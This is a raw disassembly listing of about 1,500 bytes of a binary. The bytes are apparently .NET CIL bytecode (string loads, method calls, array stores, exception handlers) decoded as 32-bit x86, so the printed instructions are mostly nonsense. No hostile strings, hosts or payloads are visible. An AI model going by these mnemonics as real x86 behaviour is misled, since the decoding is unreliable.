  402613:	25 16 72 08 12       	and    $0x12087216,%eax
  402618:	00 70 a2             	add    %dh,-0x5e(%eax)
  40261b:	25 17 7e 0a 00       	and    $0xa7e17,%eax
  402620:	00 04 0c             	add    %al,(%esp,%ecx,1)
  402623:	12 02                	adc    (%edx),%al
  402625:	fe                   	(bad)
  402626:	16                   	push   %ss
  402627:	15 00 00 01 6f       	adc    $0x6f010000,%eax
  40262c:	14 00                	adc    $0x0,%al
  40262e:	00 0a                	add    %cl,(%edx)
  402630:	a2 25 18 72 96       	mov    %al,0x96721825
  402635:	1f                   	pop    %ds
  402636:	00 70 a2             	add    %dh,-0x5e(%eax)
  402639:	25 19 7e 19 00       	and    $0x197e19,%eax
  40263e:	00 04 a2             	add    %al,(%edx,%eiz,4)
  402641:	25 1a 72 43 20       	and    $0x2043721a,%eax
  402646:	00 70 a2             	add    %dh,-0x5e(%eax)
  402649:	25 1b 7e 1e 00       	and    $0x1e7e1b,%eax
  40264e:	00 04 a2             	add    %al,(%edx,%eiz,4)
  402651:	25 1c 72 87 20       	and    $0x2087721c,%eax
  402656:	00 70 a2             	add    %dh,-0x5e(%eax)
  402659:	25 1d 7e 1f 00       	and    $0x1f7e1d,%eax
  40265e:	00 04 a2             	add    %al,(%edx,%eiz,4)
  402661:	25 1e 72 18 22       	and    $0x2218721e,%eax
  402666:	00 70 a2             	add    %dh,-0x5e(%eax)
  402669:	25 1f 09 7e 1f       	and    $0x1f7e091f,%eax
  40266e:	00 00                	add    %al,(%eax)
  402670:	04 a2                	add    $0xa2,%al
  402672:	25 1f 0a 72 66       	and    $0x66720a1f,%eax
  402677:	22 00                	and    (%eax),%al
  402679:	70 a2                	jo     0x40261d
  40267b:	28 17                	sub    %dl,(%edi)
  40267d:	00 00                	add    %al,(%eax)
  40267f:	0a 6f 13             	or     0x13(%edi),%ch
  402682:	00 00                	add    %al,(%eax)
  402684:	0a 26                	or     (%esi),%ah
  402686:	07                   	pop    %es
  402687:	1f                   	pop    %ds
  402688:	0b 8d 23 00 00 01    	or     0x1000023(%ebp),%ecx
  40268e:	25 16 72 08 12       	and    $0x12087216,%eax
  402693:	00 70 a2             	add    %dh,-0x5e(%eax)
  402696:	25 17 7e 0a 00       	and    $0xa7e17,%eax
  40269b:	00 04 0c             	add    %al,(%esp,%ecx,1)
  40269e:	12 02                	adc    (%edx),%al
  4026a0:	fe                   	(bad)
  4026a1:	16                   	push   %ss
  4026a2:	15 00 00 01 6f       	adc    $0x6f010000,%eax
  4026a7:	14 00                	adc    $0x0,%al
  4026a9:	00 0a                	add    %cl,(%edx)
  4026ab:	a2 25 18 72 e0       	mov    %al,0xe0721825
  4026b0:	22 00                	and    (%eax),%al
  4026b2:	70 a2                	jo     0x402656
  4026b4:	25 19 7e 1b 00       	and    $0x1b7e19,%eax
  4026b9:	00 04 a2             	add    %al,(%edx,%eiz,4)
  4026bc:	25 1a 72 7f 23       	and    $0x237f721a,%eax
  4026c1:	00 70 a2             	add    %dh,-0x5e(%eax)
  4026c4:	25 1b 7e 1f 00       	and    $0x1f7e1b,%eax
  4026c9:	00 04 a2             	add    %al,(%edx,%eiz,4)
  4026cc:	25 1c 72 cd 23       	and    $0x23cd721c,%eax
  4026d1:	00 70 a2             	add    %dh,-0x5e(%eax)
  4026d4:	25 1d 7e 1c 00       	and    $0x1c7e1d,%eax
  4026d9:	00 04 a2             	add    %al,(%edx,%eiz,4)
  4026dc:	25 1e 72 29 24       	and    $0x2429721e,%eax
  4026e1:	00 70 a2             	add    %dh,-0x5e(%eax)
  4026e4:	25 1f 09 7e 1d       	and    $0x1d7e091f,%eax
  4026e9:	00 00                	add    %al,(%eax)
  4026eb:	04 a2                	add    $0xa2,%al
  4026ed:	25 1f 0a 72 87       	and    $0x87720a1f,%eax
  4026f2:	24 00                	and    $0x0,%al
  4026f4:	70 a2                	jo     0x402698
  4026f6:	28 17                	sub    %dl,(%edi)
  4026f8:	00 00                	add    %al,(%eax)
  4026fa:	0a 6f 13             	or     0x13(%edi),%ch
  4026fd:	00 00                	add    %al,(%eax)
  4026ff:	0a 26                	or     (%esi),%ah
  402701:	02 07                	add    (%edi),%al
  402703:	6f                   	outsl  %ds:(%esi),(%dx)
  402704:	14 00                	adc    $0x0,%al
  402706:	00 0a                	add    %cl,(%edx)
  402708:	6f                   	outsl  %ds:(%esi),(%dx)
  402709:	18 00                	sbb    %al,(%eax)
  40270b:	00 0a                	add    %cl,(%edx)
  40270d:	00 00                	add    %al,(%eax)
  40270f:	72 f3                	jb     0x402704
  402711:	24 00                	and    $0x0,%al
  402713:	70 28                	jo     0x40273d
  402715:	1e                   	push   %ds
  402716:	00 00                	add    %al,(%eax)
  402718:	0a 00                	or     (%eax),%al
  40271a:	02 6f 19             	add    0x19(%edi),%ch
  40271d:	00 00                	add    %al,(%eax)
  40271f:	0a 0a                	or     (%edx),%cl
  402721:	06                   	push   %es
  402722:	6f                   	outsl  %ds:(%esi),(%dx)
  402723:	1f                   	pop    %ds
  402724:	00 00                	add    %al,(%eax)
  402726:	0a 00                	or     (%eax),%al
  402728:	17                   	pop    %ss
  402729:	0d de 29 13 04       	or     $0x41329de,%eax
  40272e:	00 72 25             	add    %dh,0x25(%edx)
  402731:	25 00 70 28 1e       	and    $0x1e287000,%eax
  402736:	00 00                	add    %al,(%eax)
  402738:	0a 00                	or     (%eax),%al
  40273a:	72 e8                	jb     0x402724
  40273c:	11 00                	adc    %eax,(%eax)
  40273e:	70 11                	jo     0x402751
  402740:	04 6f                	add    $0x6f,%al
  402742:	21 00                	and    %eax,(%eax)
  402744:	00 0a                	add    %cl,(%edx)
  402746:	28 22                	sub    %ah,(%edx)
  402748:	00 00                	add    %al,(%eax)
  40274a:	0a 28                	or     (%eax),%ch
  40274c:	1e                   	push   %ds
  40274d:	00 00                	add    %al,(%eax)
  40274f:	0a 00                	or     (%eax),%al
  402751:	16                   	push   %ss
  402752:	0d de 00 09 2a       	or     $0x2a0900de,%eax
  402757:	00 01                	add    %al,(%ecx)
  402759:	10 00                	adc    %al,(%eax)
  40275b:	00 00                	add    %al,(%eax)
  40275d:	00 7e 01             	add    %bh,0x1(%esi)
  402760:	1e                   	push   %ds
  402761:	9c                   	pushf
  402762:	01 29                	add    %ebp,(%ecx)
  402764:	16                   	push   %ss
  402765:	00 00                	add    %al,(%eax)
  402767:	01 1b                	add    %ebx,(%ebx)
  402769:	30 05 00 36 01 00    	xor    %al,0x13600
  40276f:	00 03                	add    %al,(%ebx)
  402771:	00 00                	add    %al,(%eax)
  402773:	11 00                	adc    %eax,(%eax)
  402775:	73 12                	jae    0x402789
  402777:	00 00                	add    %al,(%eax)
  402779:	0a 0b                	or     (%ebx),%cl
  40277b:	7e 23                	jle    0x4027a0
  40277d:	00 00                	add    %al,(%eax)
  40277f:	0a 0c 7e             	or     (%esi,%edi,2),%cl
  402782:	13 00                	adc    (%eax),%eax
  402784:	00 04 0d 09 2c 3d 00 	add    %al,0x3d2c09(,%ecx,1)
  40278b:	1b 8d 23 00 00 01    	sbb    0x1000023(%ebp),%ecx
  402791:	25 16 72 83 25       	and    $0x25837216,%eax
  402796:	00 70 a2             	add    %dh,-0x5e(%eax)
  402799:	25 17 7e 11 00       	and    $0x117e17,%eax
  40279e:	00 04 a2             	add    %al,(%edx,%eiz,4)
  4027a1:	25 18 72 95 25       	and    $0x25957218,%eax
  4027a6:	00 70 a2             	add    %dh,-0x5e(%eax)
  4027a9:	25 19 7f 12 00       	and    $0x127f19,%eax
  4027ae:	00 04 28             	add    %al,(%eax,%ebp,1)
  4027b1:	24 00                	and    $0x0,%al
  4027b3:	00 0a                	add    %cl,(%edx)
  4027b5:	a2 25 1a 72 99       	mov    %al,0x99721a25
  4027ba:	25 00 70 a2 28       	and    $0x28a27000,%eax
  4027bf:	17                   	pop    %ss
  4027c0:	00 00                	add    %al,(%eax)
  4027c2:	0a 0c 00             	or     (%eax,%eax,1),%cl
  4027c5:	2b 54 7e 13          	sub    0x13(%esi,%edi,2),%edx
  4027c9:	00 00                	add    %al,(%eax)
  4027cb:	04 16                	add    $0x16,%al
  4027cd:	fe 01                	incb   (%ecx)
  4027cf:	13 04 11             	adc    (%ecx,%edx,1),%eax
  4027d2:	04 2c                	add    $0x2c,%al
  4027d4:	3d 00 1b 8d 23       	cmp    $0x238d1b00,%eax
  4027d9:	00 00                	add    %al,(%eax)
  4027db:	01 25 16 72 c3 25    	add    %esp,0x25c37216
  4027e1:	00 70 a2             	add    %dh,-0x5e(%eax)
  4027e4:	25 17 7e 11 00       	and    $0x117e17,%eax
  4027e9:	00 04 a2             	add    %al,(%edx,%eiz,4)
  4027ec:	25 18 72 95 25       	and    $0x25957218,%eax
  4027f1:	00 70 a2             	add    %dh,-0x5e(%eax)
  4027f4:	25 19 7f 12 00       	and    $0x127f19,%eax
  4027f9:	00 04 28             	add    %al,(%eax,%ebp,1)
  4027fc:	24 00                	and    $0x0,%al
  4027fe:	00 0a                	add    %cl,(%edx)
  402800:	a2 25 1a 72 99       	mov    %al,0x99721a25
  402805:	25 00 70 a2 28       	and    $0x28a27000,%eax
  40280a:	17                   	pop    %ss
  40280b:	00 00                	add    %al,(%eax)
  40280d:	0a 0c 00             	or     (%eax,%eax,1),%cl
  402810:	2b 09                	sub    (%ecx),%ecx
  402812:	00 16                	add    %dl,(%esi)
  402814:	13 05 38 8c 00 00    	adc    0x8c38,%eax
  40281a:	00 07                	add    %al,(%edi)
  40281c:	1b 8d 23 00 00 01    	sbb    0x1000023(%ebp),%ecx
  402822:	25 16 72 d3 25       	and    $0x25d37216,%eax
  402827:	00 70 a2             	add    %dh,-0x5e(%eax)
  40282a:	25 17 7e 06 00       	and    $0x67e17,%eax
  40282f:	00 04 a2             	add    %al,(%edx,%eiz,4)
  402832:	25 18 72 45 26       	and    $0x26457218,%eax
  402837:	00 70 a2             	add    %dh,-0x5e(%eax)
  40283a:	25 19 08 a2 25       	and    $0x25a20819,%eax
  40283f:	1a 72 59             	sbb    0x59(%edx),%dh
  402842:	26 00 70 a2          	add    %dh,%es:-0x5e(%eax)
  402846:	28 17                	sub    %dl,(%edi)
  402848:	00 00                	add    %al,(%eax)
  40284a:	0a 6f 13             	or     0x13(%edi),%ch
  40284d:	00 00                	add    %al,(%eax)
  40284f:	0a 26                	or     (%esi),%ah
  402851:	02 07                	add    (%edi),%al
  402853:	6f                   	outsl  %ds:(%esi),(%dx)
  402854:	14 00                	adc    $0x0,%al
  402856:	00 0a                	add    %cl,(%edx)
  402858:	6f                   	outsl  %ds:(%esi),(%dx)
  402859:	18 00                	sbb    %al,(%eax)
  40285b:	00 0a                	add    %cl,(%edx)
  40285d:	00 00                	add    %al,(%eax)
  40285f:	72 87                	jb     0x4027e8
  402861:	26 00 70 28          	add    %dh,%es:0x28(%eax)
  402865:	1e                   	push   %ds
  402866:	00 00                	add    %al,(%eax)
  402868:	0a 00                	or     (%eax),%al
  40286a:	02 6f 19             	add    0x19(%edi),%ch
  40286d:	00 00                	add    %al,(%eax)
  40286f:	0a 0a                	or     (%edx),%cl
  402871:	06                   	push   %es
  402872:	6f                   	outsl  %ds:(%esi),(%dx)
  402873:	1f                   	pop    %ds
  402874:	00 00                	add    %al,(%eax)
  402876:	0a 00                	or     (%eax),%al
  402878:	17                   	pop    %ss
  402879:	13 05 de 2a 13 06    	adc    0x6132ade,%eax
  40287f:	00 72 ad             	add    %dh,-0x53(%edx)
  402882:	26 00 70 28          	add    %dh,%es:0x28(%eax)
  402886:	1e                   	push   %ds
  402887:	00 00                	add    %al,(%eax)
  402889:	0a 00                	or     (%eax),%al
  40288b:	72 e8                	jb     0x402875
  40288d:	11 00                	adc    %eax,(%eax)
  40288f:	70 11                	jo     0x4028a2
  402891:	06                   	push   %es
  402892:	6f                   	outsl  %ds:(%esi),(%dx)
  402893:	21 00                	and    %eax,(%eax)
  402895:	00 0a                	add    %cl,(%edx)
  402897:	28 22                	sub    %ah,(%edx)
  402899:	00 00                	add    %al,(%eax)
  40289b:	0a 28                	or     (%eax),%ch
  40289d:	1e                   	push   %ds
  40289e:	00 00                	add    %al,(%eax)
  4028a0:	0a 00                	or     (%eax),%al
  4028a2:	16                   	push   %ss
  4028a3:	13 05 de 00 11 05    	adc    0x51100de,%eax
  4028a9:	2a 00                	sub    (%eax),%al
  4028ab:	00 01                	add    %al,(%ecx)
  4028ad:	10 00                	adc    %al,(%eax)
  4028af:	00 00                	add    %al,(%eax)
  4028b1:	00 ea                	add    %ch,%dl
  4028b3:	00 1f                	add    %bl,(%edi)
  4028b5:	09 01                	or     %eax,(%ecx)
  4028b7:	2a 16                	sub    (%esi),%dl
  4028b9:	00 00                	add    %al,(%eax)
  4028bb:	01 1b                	add    %ebx,(%ebx)
  4028bd:	30 03                	xor    %al,(%ebx)
  4028bf:	00 76 00             	add    %dh,0x0(%esi)
  4028c2:	00 00                	add    %al,(%eax)
  4028c4:	04 00                	add    $0x0,%al
  4028c6:	00 11                	add    %dl,(%ecx)
  4028c8:	00 73 12             	add    %dh,0x12(%ebx)
  4028cb:	00 00                	add    %al,(%eax)
  4028cd:	0a 0b                	or     (%ebx),%cl
  4028cf:	07                   	pop    %es
  4028d0:	72 ff                	jb     0x4028d1
  4028d2:	26 00 70 7f          	add    %dh,%es:0x7f(%eax)
  4028d6:	16                   	push   %ss
  4028d7:	00 00                	add    %al,(%eax)
  4028d9:	04 28                	add    $0x28,%al
  4028db:	24 00                	and    $0x0,%al
  4028dd:	00 0a                	add    %cl,(%edx)
  4028df:	28 22                	sub    %ah,(%edx)
  4028e1:	00 00                	add    %al,(%eax)
  4028e3:	0a 6f 13             	or     0x13(%edi),%ch
  4028e6:	00 00                	add    %al,(%eax)
  4028e8:	0a 26                	or     (%esi),%ah
  4028ea:	02 07                	add    (%edi),%al
  4028ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4028ed:	14 00                	adc    $0x0,%al
  4028ef:	00 0a                	add    %cl,(%edx)
  4028f1:	6f                   	outsl  %ds:(%esi),(%dx)
  4028f2:	18 00                	sbb    %al,(%eax)
  4028f4:	00 0a                	add    %cl,(%edx)
  4028f6:	00 00                	add    %al,(%eax)
  4028f8:	72 55                	jb     0x40294f
  4028fa:	27                   	daa
  4028fb:	00 70 28             	add    %dh,0x28(%eax)
  4028fe:	1e                   	push   %ds
  4028ff:	00 00                	add    %al,(%eax)
  402901:	0a 00                	or     (%eax),%al
  402903:	02 6f 19             	add    0x19(%edi),%ch
  402906:	00 00                	add    %al,(%eax)
  402908:	0a 0a                	or     (%edx),%cl
  40290a:	06                   	push   %es
  40290b:	6f                   	outsl  %ds:(%esi),(%dx)
  40290c:	1f                   	pop    %ds
  40290d:	00 00                	add    %al,(%eax)
  40290f:	0a 00                	or     (%eax),%al
  402911:	17                   	pop    %ss
  402912:	0c de                	or     $0xde,%al
  402914:	27                   	daa
  402915:	0d 00 72 7b 27       	or     $0x277b7200,%eax
  40291a:	00 70 28             	add    %dh,0x28(%eax)
  40291d:	1e                   	push   %ds
  40291e:	00 00                	add    %al,(%eax)
  402920:	0a 00                	or     (%eax),%al
  402922:	72 e8                	jb     0x40290c
  402924:	11 00                	adc    %eax,(%eax)
  402926:	70 09                	jo     0x402931
  402928:	6f                   	outsl  %ds:(%esi),(%dx)
  402929:	21 00                	and    %eax,(%eax)
  40292b:	00 0a                	add    %cl,(%edx)
  40292d:	28 22                	sub    %ah,(%edx)
  40292f:	00 00                	add    %al,(%eax)
  402931:	0a 28                	or     (%eax),%ch
  402933:	1e                   	push   %ds
  402934:	00 00                	add    %al,(%eax)
  402936:	0a 00                	or     (%eax),%al
  402938:	16                   	push   %ss
  402939:	0c de                	or     $0xde,%al
  40293b:	00 08                	add    %cl,(%eax)
  40293d:	2a 00                	sub    (%eax),%al
  40293f:	00 01                	add    %al,(%ecx)
  402941:	10 00                	adc    %al,(%eax)
  402943:	00 00                	add    %al,(%eax)
  402945:	00 2f                	add    %ch,(%edi)
  402947:	00 1e                	add    %bl,(%esi)
  402949:	4d                   	dec    %ebp
  40294a:	00 27                	add    %ah,(%edi)
  40294c:	16                   	push   %ss
  40294d:	00 00                	add    %al,(%eax)
  40294f:	01 1b                	add    %ebx,(%ebx)
  402951:	30 05 00 26 03 00    	xor    %al,0x32600
  402957:	00 05 00 00 11 00    	add    %al,0x110000
  40295d:	73 12                	jae    0x402971
  40295f:	00 00                	add    %al,(%eax)
  402961:	0a 0b                	or     (%ebx),%cl
  402963:	73 11                	jae    0x402976
  402965:	00 00                	add    %al,(%eax)
  402967:	0a 0c 07             	or     (%edi,%eax,1),%cl
  40296a:	72 01                	jb     0x40296d
  40296c:	00 00                	add    %al,(%eax)
  40296e:	70 6f                	jo     0x4029df
  402970:	13 00                	adc    (%eax),%eax
  402972:	00 0a                	add    %cl,(%edx)
  402974:	26 07                	es pop %es
  402976:	72 2f                	jb     0x4029a7
  402978:	00 00                	add    %al,(%eax)
  40297a:	70 6f                	jo     0x4029eb
  40297c:	13 00                	adc    (%eax),%eax
  40297e:	00 0a                	add    %cl,(%edx)
  402980:	26 07                	es pop %es
  402982:	72 6b                	jb     0x4029ef
  402984:	00 00                	add    %al,(%eax)
  402986:	70 6f                	jo     0x4029f7
  402988:	13 00                	adc    (%eax),%eax
  40298a:	00 0a                	add    %cl,(%edx)
  40298c:	26 07                	es pop %es
  40298e:	72 cd                	jb     0x40295d
  402990:	27                   	daa
  402991:	00 70 6f             	add    %dh,0x6f(%eax)
  402994:	13 00                	adc    (%eax),%eax
  402996:	00 0a                	add    %cl,(%edx)
  402998:	26 07                	es pop %es
  40299a:	72 90                	jb     0x40292c
  40299c:	03 00                	add    (%eax),%eax
  40299e:	70 7e                	jo     0x402a1e
  4029a0:	0a 00                	or     (%eax),%al
  4029a2:	00 04 0d 12 03 fe 16 	add    %al,0x16fe0312(,%ecx,1)
  4029a9:	15 00 00 01 6f       	adc    $0x6f010000,%eax
  4029ae:	14 00                	adc    $0x0,%al
  4029b0:	00 0a                	add    %cl,(%edx)
  4029b2:	72 e4                	jb     0x402998
  4029b4:	28 00                	sub    %al,(%eax)
  4029b6:	70 28                	jo     0x4029e0
  4029b8:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
  4029bd:	13 00                	adc    (%eax),%eax
  4029bf:	00 0a                	add    %cl,(%edx)
  4029c1:	26 07                	es pop %es
  4029c3:	1d 8d 23 00 00       	sbb    $0x238d,%eax
  4029c8:	01 25 16 72 18 29    	add    %esp,0x29187216
  4029ce:	00 70 a2             	add    %dh,-0x5e(%eax)
  4029d1:	25 17 7e 1b 00       	and    $0x1b7e17,%eax
  4029d6:	00 04 a2             	add    %al,(%edx,%eiz,4)
  4029d9:	25 18 72 33 2a       	and    $0x2a337218,%eax
  4029de:	00 70 a2             	add    %dh,-0x5e(%eax)
  4029e1:	25 19 7e 1a 00       	and    $0x1a7e19,%eax
  4029e6:	00 04 a2             	add    %al,(%edx,%eiz,4)
  4029e9:	25 1a 72 d0 2a       	and    $0x2ad0721a,%eax
  4029ee:	00 70 a2             	add    %dh,-0x5e(%eax)
  4029f1:	25 1b 7e 19 00       	and    $0x197e1b,%eax
  4029f6:	00 04 a2             	add    %al,(%edx,%eiz,4)
  4029f9:	25 1c 72 55 2b       	and    $0x2b55721c,%eax
  4029fe:	00 70 a2             	add    %dh,-0x5e(%eax)
  402a01:	28 17                	sub    %dl,(%edi)
  402a03:	00 00                	add    %al,(%eax)
  402a05:	0a 6f 13             	or     0x13(%edi),%ch
  402a08:	00 00                	add    %al,(%eax)
  402a0a:	0a 26                	or     (%esi),%ah
  402a0c:	07                   	pop    %es
  402a0d:	72 5b                	jb     0x402a6a
  402a0f:	2b 00                	sub    (%eax),%eax
  402a11:	70 7e                	jo     0x402a91
  402a13:	1f                   	pop    %ds
  402a14:	00 00                	add    %al,(%eax)
  402a16:	04 72                	add    $0x72,%al
  402a18:	81 2b 00 70 28 15    	subl   $0x15287000,(%ebx)
  402a1e:	00 00                	add    %al,(%eax)
  402a20:	0a 6f 13             	or     0x13(%edi),%ch
  402a23:	00 00                	add    %al,(%eax)
  402a25:	0a 26                	or     (%esi),%ah
  402a27:	07                   	pop    %es
  402a28:	72 a5                	jb     0x4029cf
  402a2a:	2b 00                	sub    (%eax),%eax
  402a2c:	70 7e                	jo     0x402aac
  402a2e:	1c 00                	sbb    $0x0,%al
  402a30:	00 04 72             	add    %al,(%edx,%esi,2)
  402a33:	db 2b                	fldt   (%ebx)
  402a35:	00 70 28             	add    %dh,0x28(%eax)
  402a38:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
  402a3d:	13 00                	adc    (%eax),%eax
  402a3f:	00 0a                	add    %cl,(%edx)
  402a41:	26 07                	es pop %es
  402a43:	72 0f                	jb     0x402a54
  402a45:	2c 00                	sub    $0x0,%al
  402a47:	70 7e                	jo     0x402ac7
  402a49:	1d 00 00 04 72       	sbb    $0x72040000,%eax
  402a4e:	37                   	aaa
  402a4f:	2c 00                	sub    $0x0,%al
  402a51:	70 28                	jo     0x402a7b
  402a53:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
  402a58:	13 00                	adc    (%eax),%eax
  402a5a:	00 0a                	add    %cl,(%edx)
  402a5c:	26 07                	es pop %es
  402a5e:	72 5a                	jb     0x402aba
  402a60:	07                   	pop    %es
  402a61:	00 70 6f             	add    %dh,0x6f(%eax)
  402a64:	13 00                	adc    (%eax),%eax
  402a66:	00 0a                	add    %cl,(%edx)
  402a68:	26 07                	es pop %es
  402a6a:	72 80                	jb     0x4029ec
  402a6c:	07                   	pop    %es
  402a6d:	00 70 6f             	add    %dh,0x6f(%eax)
  402a70:	13 00                	adc    (%eax),%eax
  402a72:	00 0a                	add    %cl,(%edx)
  402a74:	26 07                	es pop %es
  402a76:	72 ca                	jb     0x402a42
  402a78:	07                   	pop    %es
  402a79:	00 70 6f             	add    %dh,0x6f(%eax)
  402a7c:	13 00                	adc    (%eax),%eax
  402a7e:	00 0a                	add    %cl,(%edx)
  402a80:	26 07                	es pop %es
  402a82:	72 02                	jb     0x402a86
  402a84:	08 00                	or     %al,(%eax)
  402a86:	70 6f                	jo     0x402af7
  402a88:	13 00                	adc    (%eax),%eax
  402a8a:	00 0a                	add    %cl,(%edx)
  402a8c:	26 07                	es pop %es
  402a8e:	72 5d                	jb     0x402aed
  402a90:	2c 00                	sub    $0x0,%al
  402a92:	70 7e                	jo     0x402b12
  402a94:	19 00                	sbb    %eax,(%eax)
  402a96:	00 04 72             	add    %al,(%edx,%esi,2)
  402a99:	7b 2c                	jnp    0x402ac7
  402a9b:	00 70 28             	add    %dh,0x28(%eax)
  402a9e:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
  402aa3:	13 00                	adc    (%eax),%eax
  402aa5:	00 0a                	add    %cl,(%edx)
  402aa7:	26 07                	es pop %es
  402aa9:	72 95                	jb     0x402a40
  402aab:	2c 00                	sub    $0x0,%al
  402aad:	70 7e                	jo     0x402b2d
  402aaf:	1e                   	push   %ds
  402ab0:	00 00                	add    %al,(%eax)
  402ab2:	04 72                	add    $0x72,%al
  402ab4:	bf 2c 00 70 28       	mov    $0x2870002c,%edi
  402ab9:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
  402abe:	13 00                	adc    (%eax),%eax
  402ac0:	00 0a                	add    %cl,(%edx)
  402ac2:	26 07                	es pop %es
  402ac4:	72 e5                	jb     0x402aab
  402ac6:	2c 00                	sub    $0x0,%al
  402ac8:	70 6f                	jo     0x402b39
  402aca:	13 00                	adc    (%eax),%eax
  402acc:	00 0a                	add    %cl,(%edx)
  402ace:	26 07                	es pop %es
  402ad0:	72 26                	jb     0x402af8
  402ad2:	2e 00 70 7e          	add    %dh,%cs:0x7e(%eax)
  402ad6:	1f                   	pop    %ds
  402ad7:	00 00                	add    %al,(%eax)
  402ad9:	04 72                	add    $0x72,%al
  402adb:	50                   	push   %eax
  402adc:	2e 00 70 28          	add    %dh,%cs:0x28(%eax)
  402ae0:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
  402ae5:	13 00                	adc    (%eax),%eax
  402ae7:	00 0a                	add    %cl,(%edx)
  402ae9:	26 07                	es pop %es
  402aeb:	72 76                	jb     0x402b63
  402aed:	2e 00 70 7e          	add    %dh,%cs:0x7e(%eax)
  402af1:	1f                   	pop    %ds
  402af2:	00 00                	add    %al,(%eax)
  402af4:	04 72                	add    $0x72,%al
  402af6:	81 2b 00 70 28 15    	subl   $0x15287000,(%ebx)
  402afc:	00 00                	add    %al,(%eax)
  402afe:	0a 6f 13             	or     0x13(%edi),%ch
  402b01:	00 00                	add    %al,(%eax)
  402b03:	0a 26                	or     (%esi),%ah
  402b05:	07                   	pop    %es
  402b06:	72 9a                	jb     0x402aa2
  402b08:	08 00                	or     %al,(%eax)
  402b0a:	70 6f                	jo     0x402b7b
  402b0c:	13 00                	adc    (%eax),%eax
  402b0e:	00 0a                	add    %cl,(%edx)
  402b10:	26 07                	es pop %es
  402b12:	72 d4                	jb     0x402ae8
  402b14:	08 00                	or     %al,(%eax)
  402b16:	70 6f                	jo     0x402b87
  402b18:	13 00                	adc    (%eax),%eax
  402b1a:	00 0a                	add    %cl,(%edx)
  402b1c:	26 07                	es pop %es
  402b1e:	72 9e                	jb     0x402abe
  402b20:	2e 00 70 6f          	add    %dh,%cs:0x6f(%eax)
  402b24:	13 00                	adc    (%eax),%eax
  402b26:	00 0a                	add    %cl,(%edx)
  402b28:	26 07                	es pop %es
  402b2a:	72 c8                	jb     0x402af4
  402b2c:	2e 00 70 6f          	add    %dh,%cs:0x6f(%eax)
  402b30:	13 00                	adc    (%eax),%eax
  402b32:	00 0a                	add    %cl,(%edx)
  402b34:	26 07                	es pop %es
  402b36:	72 f4                	jb     0x402b2c
  402b38:	2e 00 70 6f          	add    %dh,%cs:0x6f(%eax)
  402b3c:	13 00                	adc    (%eax),%eax
  402b3e:	00 0a                	add    %cl,(%edx)
  402b40:	26 07                	es pop %es
  402b42:	72 40                	jb     0x402b84
  402b44:	2f                   	das
  402b45:	00 70 6f             	add    %dh,0x6f(%eax)
  402b48:	13 00                	adc    (%eax),%eax
  402b4a:	00 0a                	add    %cl,(%edx)
  402b4c:	26 07                	es pop %es
  402b4e:	72 d7                	jb     0x402b27
  402b50:	2f                   	das
  402b51:	00 70 6f             	add    %dh,0x6f(%eax)
  402b54:	13 00                	adc    (%eax),%eax
  402b56:	00 0a                	add    %cl,(%edx)
  402b58:	26 07                	es pop %es
  402b5a:	72 01                	jb     0x402b5d
  402b5c:	30 00                	xor    %al,(%eax)
  402b5e:	70 6f                	jo     0x402bcf
  402b60:	13 00                	adc    (%eax),%eax
  402b62:	00 0a                	add    %cl,(%edx)
  402b64:	26 07                	es pop %es
  402b66:	72 2f                	jb     0x402b97
  402b68:	30 00                	xor    %al,(%eax)
  402b6a:	70 6f                	jo     0x402bdb
  402b6c:	13 00                	adc    (%eax),%eax
  402b6e:	00 0a                	add    %cl,(%edx)
  402b70:	26 07                	es pop %es
  402b72:	72 5d                	jb     0x402bd1
  402b74:	30 00                	xor    %al,(%eax)
  402b76:	70 7e                	jo     0x402bf6
  402b78:	09 00                	or     %eax,(%eax)
  402b7a:	00 04 0d 12 03 fe 16 	add    %al,0x16fe0312(,%ecx,1)
  402b81:	15 00 00 01 6f       	adc    $0x6f010000,%eax
  402b86:	14 00                	adc    $0x0,%al
  402b88:	00 0a                	add    %cl,(%edx)
  402b8a:	72 d0                	jb     0x402b5c
  402b8c:	03 00                	add    (%eax),%eax
  402b8e:	70 28                	jo     0x402bb8
  402b90:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
  402b95:	13 00                	adc    (%eax),%eax
  402b97:	00 0a                	add    %cl,(%edx)
  402b99:	26 07                	es pop %es
  402b9b:	72 a1                	jb     0x402b3e
  402b9d:	30 00                	xor    %al,(%eax)
  402b9f:	70 6f                	jo     0x402c10
  402ba1:	13 00                	adc    (%eax),%eax
  402ba3:	00 0a                	add    %cl,(%edx)
  402ba5:	26 07                	es pop %es
  402ba7:	72 d1                	jb     0x402b7a
  402ba9:	30 00                	xor    %al,(%eax)
  402bab:	70 6f                	jo     0x402c1c
  402bad:	13 00                	adc    (%eax),%eax
  402baf:	00 0a                	add    %cl,(%edx)
  402bb1:	26 07                	es pop %es
  402bb3:	72 fd                	jb     0x402bb2
  402bb5:	30 00                	xor    %al,(%eax)
  402bb7:	70 6f                	jo     0x402c28
  402bb9:	13 00                	adc    (%eax),%eax
  402bbb:	00 0a                	add    %cl,(%edx)
  402bbd:	26 07                	es pop %es
  402bbf:	72 0e                	jb     0x402bcf
  402bc1:	32 00                	xor    (%eax),%al
  402bc3:	70 6f                	jo     0x402c34
  402bc5:	13 00                	adc    (%eax),%eax
  402bc7:	00 0a                	add    %cl,(%edx)
  402bc9:	26 02 07             	add    %es:(%edi),%al
  402bcc:	6f                   	outsl  %ds:(%esi),(%dx)
  402bcd:	14 00                	adc    $0x0,%al
  402bcf:	00 0a                	add    %cl,(%edx)
  402bd1:	6f                   	outsl  %ds:(%esi),(%dx)
  402bd2:	18 00                	sbb    %al,(%eax)
  402bd4:	00 0a                	add    %cl,(%edx)
  402bd6:	00 00                	add    %al,(%eax)
  402bd8:	02 6f 19             	add    0x19(%edi),%ch
  402bdb:	00 00                	add    %al,(%eax)
  402bdd:	0a 0a                	or     (%edx),%cl
  402bdf:	08 06                	or     %al,(%esi)
  402be1:	6f                   	outsl  %ds:(%esi),(%dx)
  402be2:	1a 00                	sbb    (%eax),%al
  402be4:	00 0a                	add    %cl,(%edx)
  402be6:	00 08                	add    %cl,(%eax)
  402be8:	6f                   	outsl  %ds:(%esi),(%dx)
  402be9:	1b 00                	sbb    (%eax),%eax
